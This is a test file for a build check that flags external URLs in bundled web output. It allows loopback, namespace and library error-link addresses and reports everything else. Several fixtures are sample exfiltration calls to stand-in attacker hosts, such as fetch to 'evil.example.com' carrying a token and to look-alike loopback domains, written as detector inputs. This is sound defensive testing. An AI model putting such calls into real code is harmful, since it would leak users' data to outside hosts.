import { findExternalUrls } from '../../build/find-external-urls.ts';

describe('findExternalUrls', () => {
  it('reports a web font pulled from a CDN', () => {
    const css =
      "@import url('https://fonts.googleapis.com/css2?family=Inter');";

    expect(findExternalUrls(css)).toStrictEqual([
      'https://fonts.googleapis.com/css2?family=Inter',
    ]);
  });

  it('reports an analytics script and a remote image together, once each', () => {
    const html = [
      '<script src="https://cdn.example.com/analytics.js"></script>',
      '<img src="https://images.example.com/poster.png">',
      '<img src="https://images.example.com/poster.png">',
    ].join('\n');

    expect(findExternalUrls(html)).toStrictEqual([
      'https://cdn.example.com/analytics.js',
      'https://images.example.com/poster.png',
    ]);
  });

  it('allows the orchestrator on loopback, however it is addressed', () => {
    const js = [
      'fetch("http://localhost:3000/api/projects")',
      'fetch("http://127.0.0.1:3000/api/shots")',
      'fetch("http://[::1]:3000/api/render-jobs")',
    ].join('\n');

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it('allows XML namespace identifiers, which name a namespace rather than an address', () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><use xmlns:xlink="http://www.w3.org/1999/xlink"/></svg>';

    expect(findExternalUrls(svg)).toStrictEqual([]);
  });

  it("allows React's production error decoder link", () => {
    const js =
      'throw Error("Minified React error; visit https://react.dev/errors/418")';

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it("allows React Router's documentation link inside an invariant message", () => {
    const js =
      'return `${hookName} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`;';

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it('still reports a fetchable asset on an allowed documentation host', () => {
    const js = 'const font = "https://reactrouter.com/assets/inter.woff2";';

    expect(findExternalUrls(js)).toStrictEqual([
      'https://reactrouter.com/assets/inter.woff2',
    ]);
  });

  it('allows the Redux and Immer minified-error decoder links', () => {
    const js = [
      'return `Minified Redux error #${code}; visit https://redux.js.org/Errors?code=${code} for the full message.`',
      'return `Minified Redux Toolkit error #${code}; visit https://redux-toolkit.js.org/Errors?code=${code}.`',
      'throw new Error(`[Immer] minified error nr: ${e}. Full error at: https://bit.ly/3cXEKWf`)',
    ].join('\n');

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it('reports a shortened link that merely starts with the allowed one, since a shortener can be repointed', () => {
    const js = [
      'fetch("https://bit.ly/3cXEKWfZZ9")',
      'fetch("https://bit.ly/3cXEKWf/steal")',
      'fetch("https://bit.ly/some-other-link")',
    ].join('\n');

    expect(findExternalUrls(js)).toStrictEqual([
      'https://bit.ly/3cXEKWfZZ9',
      'https://bit.ly/3cXEKWf/steal',
      'https://bit.ly/some-other-link',
    ]);
  });

  it('reports a host that merely looks like loopback', () => {
    const js = 'fetch("https://localhost.evil.example.com/exfiltrate")';

    expect(findExternalUrls(js)).toStrictEqual([
      'https://localhost.evil.example.com/exfiltrate',
    ]);
  });

  it('reports a host that merely begins with the loopback range, which a prefix test let through', () => {
    const js = [
      'fetch("http://127.0.0.1.evil.com/exfiltrate")',
      'fetch("http://127.evil.com/exfiltrate")',
      'fetch("http://127.999.1.1/exfiltrate")',
    ].join('\n');

    expect(findExternalUrls(js)).toStrictEqual([
      'http://127.0.0.1.evil.com/exfiltrate',
      'http://127.evil.com/exfiltrate',
      'http://127.999.1.1/exfiltrate',
    ]);
  });

  it('allows every address in the loopback range, not only 127.0.0.1', () => {
    const js = 'fetch("http://127.255.255.255:5556/api")';

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it('ignores a URL with no literal host at all, which is how zod hands an address to the URL parser', () => {
    const js =
      'new URL(`http://[${address}]`); new URL(`https://${host}:${port}/x`)';

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it('still reports a literal external host even when the path is built at runtime', () => {
    const js = 'fetch(`https://evil.example.com/${token}`)';

    expect(findExternalUrls(js)).toStrictEqual([
      'https://evil.example.com/${token}',
    ]);
  });

  it('reports an external host that merely interpolates part of its authority', () => {
    const js = [
      'fetch(`https://${region}.amazonaws.com/bucket`)',
      'fetch(`https://${key}@o12345.ingest.sentry.io/1`)',
      'fetch(`https://api.openai.com${path}`)',
      'fetch(`https://telemetry.example.net:${port}/hit`)',
    ].join('\n');

    expect(findExternalUrls(js)).toStrictEqual([
      'https://${region}.amazonaws.com/bucket',
      'https://${key}@o12345.ingest.sentry.io/1',
      'https://api.openai.com${path}',
      'https://telemetry.example.net:${port}/hit',
    ]);
  });

  it('allows the JSON Schema dialect identifiers zod ships, which name a dialect rather than an address', () => {
    const js = [
      'const s = "https://json-schema.org/draft/2020-12/schema";',
      'const t = "http://json-schema.org/draft-07/schema#";',
      'const u = "http://json-schema.org/draft-04/schema#";',
    ].join('\n');

    expect(findExternalUrls(js)).toStrictEqual([]);
  });

  it('still reports a fetchable asset on the JSON Schema host', () => {
    const js = 'const f = "https://json-schema.org/assets/tracker.js";';

    expect(findExternalUrls(js)).toStrictEqual([
      'https://json-schema.org/assets/tracker.js',
    ]);
  });

  it('finds nothing in output that loads everything from itself', () => {
    const js =
      'const logo = "/assets/logo-a1b2c3.svg"; fetch("/api/capabilities");';

    expect(findExternalUrls(js)).toStrictEqual([]);
  });
});
